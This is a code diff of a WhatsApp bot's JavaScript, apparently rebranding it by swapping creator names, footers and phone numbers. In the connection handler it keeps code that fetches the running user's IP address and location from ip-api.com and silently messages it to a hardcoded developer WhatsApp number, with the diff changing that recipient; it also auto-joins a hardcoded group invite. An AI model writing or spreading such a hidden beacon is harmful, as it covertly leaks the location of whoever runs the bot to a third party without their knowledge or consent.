@@ -84,11 +84,11 @@ nocache('../message/help.js', module => console.log(color('[WATCH]', 'cyan'), co
  teks = `https://chat.whatsapp.com/BzhyWkAEU0t8oVl3s8p94m`
  bosco.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
  console.log(color('|WRN|', 'yellow'), color('ǫʀ ɪs ʀᴜɴɪɴɢ', 'blue'))
- bosco.sendMessage(`${setting.owner}@s.whatsapp.net`, `*𝙷𝚒 𝚋𝚛𝚘 , 𝙱𝙾𝚃 𝙸𝚂 𝙲𝙾𝙽𝙽𝙴𝙲𝚃𝙴𝙳 𝙸𝙽 𝚈𝙾𝚄𝚁 𝙽𝚄𝙼𝙱𝙴𝚁*\n────────────────────\n\`\`\`${JSON.stringify(bosco.user, null, 2)}\`\`\`\n────────────────────\n*𝙸𝚏 𝚝𝚑𝚎𝚛𝚎 𝚊𝚗𝚢 𝚎𝚛𝚛𝚘𝚛/𝚙𝚕𝚎𝚊𝚜𝚎 𝚌𝚘𝚗𝚝𝚊𝚌𝚝 𝙱𝚘𝚝 𝚘𝚠𝚗𝚎𝚛, 𝚃𝚑𝚊𝚗𝚔 𝚢𝚘𝚞 𝚏𝚘𝚛 𝚌𝚑𝚘𝚘𝚜𝚒𝚗𝚐 𝚖𝚢 𝚋𝚘𝚝*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "𝙲𝚛𝚎𝚊𝚝𝚘𝚛 pepe ",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./ds.jpg'),sourceUrl:"https://wa.me/917736622139?text=Hi bro"}}})
+ bosco.sendMessage(`${setting.owner}@s.whatsapp.net`, `*𝙷𝚒 𝚋𝚛𝚘 , 𝙱𝙾𝚃 𝙸𝚂 𝙲𝙾𝙽𝙽𝙴𝙲𝚃𝙴𝙳 𝙸𝙽 𝚈𝙾𝚄𝚁 𝙽𝚄𝙼𝙱𝙴𝚁*\n────────────────────\n\`\`\`${JSON.stringify(bosco.user, null, 2)}\`\`\`\n────────────────────\n*𝙸𝚏 𝚝𝚑𝚎𝚛𝚎 𝚊𝚗𝚢 𝚎𝚛𝚛𝚘𝚛/𝚙𝚕𝚎𝚊𝚜𝚎 𝚌𝚘𝚗𝚝𝚊𝚌𝚝 𝙱𝚘𝚝 𝚘𝚠𝚗𝚎𝚛, 𝚃𝚑𝚊𝚗𝚔 𝚢𝚘𝚞 𝚏𝚘𝚛 𝚌𝚑𝚘𝚘𝚜𝚒𝚗𝚐 𝚖𝚢 𝚋𝚘𝚝*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "ACHU SER",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./ds.jpg'),sourceUrl:"https://wa.me/918590284271?text=Hi bro"}}})
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'blue'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       bosco.sendMessage("17247805970@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer pepe ser",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./ds.jpg'),sourceUrl:"https://wa.me/917736622139?text=Hi bro"}}})
+       bosco.sendMessage("918590284271@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer ACHU SER",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./ds.jpg'),sourceUrl:"https://wa.me/918590284271?text=Hi bro"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'red'))
    })
 
@@ -142,7 +142,7 @@ fetch(`http://ip-api.com/line`).then(res => res.text())
  @${num.split('@')[0]}
 `
 			promoteBut = [{buttonId:`hm`,buttonText:{displayText:'Congrats 🥳'},type:1}]
-            promoteButt = { contentText: `${teks}`, footerText: `Thank You So Much 🌝❤️`, buttons: promoteBut, headerType: 6, locationMessage: bosco2.message.locationMessage}
+            promoteButt = { contentText: `${teks}`, footerText: `°𝐀𝐂𝐇𝐔 𝐒𝐄𝐑🦋°`, buttons: promoteBut, headerType: 6, locationMessage: bosco2.message.locationMessage}
             bosco.sendMessage(mdata.id, promoteButt, MessageType.buttonsMessage, { caption: 'hehe', "contextInfo": { "mentionedJid" : [num], },})
 		    } else if (anu.action == 'demote') {
 			num = anu.participants[0]
@@ -159,7 +159,7 @@ fetch(`http://ip-api.com/line`).then(res => res.text())
  @${num.split('@')[0]}
 `
 			demoteBut = [{buttonId:`hm`,buttonText:{displayText:'Next Time I get'},type:1}]
-            demoteButt = { contentText: `${teks}`, footerText: `Who Is the Bledy Fool 🙂`, buttons: demoteBut, headerType: 6, locationMessage: bosco4.message.locationMessage}
+            demoteButt = { contentText: `${teks}`, footerText: `°𝐀𝐂𝐇𝐔 𝐒𝐄𝐑🦋°`, buttons: demoteBut, headerType: 6, locationMessage: bosco4.message.locationMessage}
             bosco.sendMessage(mdata.id, demoteButt, MessageType.buttonsMessage, { caption: 'hehe', "contextInfo": { "mentionedJid" : [num], },})
 		    }
             } catch (e) {
